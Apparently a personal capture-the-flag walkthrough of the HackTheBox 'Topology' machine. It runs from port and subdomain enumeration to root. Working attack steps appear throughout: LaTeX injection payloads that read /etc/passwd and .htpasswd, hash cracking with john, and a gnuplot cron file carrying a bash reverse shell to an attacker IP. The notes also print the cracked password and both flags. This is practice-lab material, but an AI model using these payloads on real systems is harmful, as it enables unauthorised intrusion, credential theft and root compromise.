Topolopgy IP:10.10.11.217


rustscan:
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack



nmap:
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR4Yogc3XXHR1rv03CD80VeuNTF/y2dQcRyZCo4Z3spJ0i+YJVQe/3nTxekStsHk8J8R28Y4CDP7h0h9vnlLWo=
|   256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



gobuster vhosts:

┌──(kali㉿kali)-[~/Practice/HackTheBox/Topology]
└─$ gobuster vhost  -u http://topology.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 64                                                                            2 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://topology.htb
[+] Threads:      64
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2023/06/28 02:59:02 Starting gobuster
===============================================================
Found: stats.topology.htb (Status: 200) [Size: 108]
Found: dev.topology.htb (Status: 401) [Size: 463]




http://latex.topology.htb/equation.php


dir enumeration:



┌──(kali㉿kali)-[~/Practice/HackTheBox/Topology]
└─$ gobuster dir  -u http://topology.htb -w /usr/share/wordlists/dirb/common.txt -t 64
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://topology.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/06/28 03:06:14 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/~bin (Status: 403)
/~lp (Status: 403)
/~sys (Status: 403)
/~nobody (Status: 403)
/~mail (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
===============================================================
2023/06/28 03:09:08 Finished
===============================================================




┌──(kali㉿kali)-[~/Practice/HackTheBox/Topology]
└─$ gobuster dir  -u http://latex.topology.htb -w /usr/share/wordlists/dirb/common.txt -t 64                                                                                                     1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://latex.topology.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/06/28 03:10:02 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/~bin (Status: 403)
/~sys (Status: 403)
/~mail (Status: 403)
/~nobody (Status: 403)
/~lp (Status: 403)
/demo (Status: 301)
/javascript (Status: 301)
/server-status (Status: 403)
===============================================================
2023/06/28 03:13:21 Finished
===============================================================


we can use latex to exploit the target:
using hacktricks, we can read some files:


$\lstinputlisting{/etc/passwd}$



knowing that apache runs on the server, we use https://stackoverflow.com/questions/37545711/htpasswd-also-for-root-directory to get the htpass

we use $\lstinputlisting{/var/www/dev/.htpasswd}$ to get the pass. after this we use a image to text transformer to get the text.

vdaisley $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

after this, we save the hash in a new file and use john to get the pass:

┌──(kali㉿kali)-[~/Practice/HackTheBox/Topology]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (?)     
1g 0:00:00:04 DONE (2023-06-28 03:41) 0.2298g/s 228943p/s 228943c/s 228943C/s callel..cadesmom
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


┌──(kali㉿kali)-[~/Practice/HackTheBox/Topology]
└─$ crackmapexec ssh 10.10.11.217 -u vdaisley   -p 'calculus20'                                                                                                                                130 ⨯
SSH         10.10.11.217    22     10.10.11.217     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7
SSH         10.10.11.217    22     10.10.11.217     [+] vdaisley:calculus20 

crackmapexec confirms that the passwd will work for ssh

user flag: 
vdaisley@topology:~$ ls
user.txt
vdaisley@topology:~$ cat user.txt
d6b82f15fd8419b1a42323165c6595c0
vdaisley@topology:~$ 


upload pspy


2023/06/28 05:15:01 CMD: UID=0    PID=60288  | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
2023/06/28 05:15:01 CMD: UID=0    PID=60287  | /bin/sh -c /opt/gnuplot/getdata.sh 
2023/06/28 05:15:01 CMD: UID=0    PID=60286  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
2023/06/28 05:15:01 CMD: UID=0    PID=60298  | /bin/sh /opt/gnuplot/getdata.sh 
2023/06/28 05:15:01 CMD: UID=0    PID=60297  | /bin/sh /opt/gnuplot/getdata.sh 
2023/06/28 05:15:01 CMD: UID=0    PID=60296  | /bin/sh /opt/gnuplot/getdata.sh 
2023/06/28 05:15:01 CMD: UID=0    PID=60295  | 
2023/06/28 05:15:01 CMD: UID=0    PID=60290  | /bin/sh /opt/gnuplot/getdata.sh 
2023/06/28 05:15:01 CMD: UID=0    PID=60289  | gnuplot /opt/gnuplot/loadplot.plt 
2023/06/28 05:15:01 CMD: UID=0    PID=60299  | 
2023/06/28 05:15:01 CMD: UID=0    PID=60300  | /bin/sh /opt/gnuplot/getdata.sh 
2023/06/28 05:15:01 CMD: UID=0    PID=60301  | gnuplot /opt/gnuplot/networkplot.plt 



priv esc using gnuplot:
vdaisley@topology:/opt$ touch /opt/gnuplot/ys_exploit.plt
vdaisley@topology:/opt$ nano  /opt/gnuplot/ys_exploit.plt

vdaisley@topology:/opt$ cat  /opt/gnuplot/ys_exploit.plt
system "bash -c 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1'"





┌──(kali㉿kali)-[~/Practice/HackTheBox/Topology]
└─$ nc -lnvp 9001                                                                                                                                                                        
listening on [any] 9001 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.217] 40194
bash: cannot set terminal process group (60660): Inappropriate ioctl for device
bash: no job control in this shell
root@topology:~# ls
ls
root.txt
root@topology:~# cat root.txt
cat root.txt
446ffee5d9481e9bc684790ea99b253d
root@topology:~# 
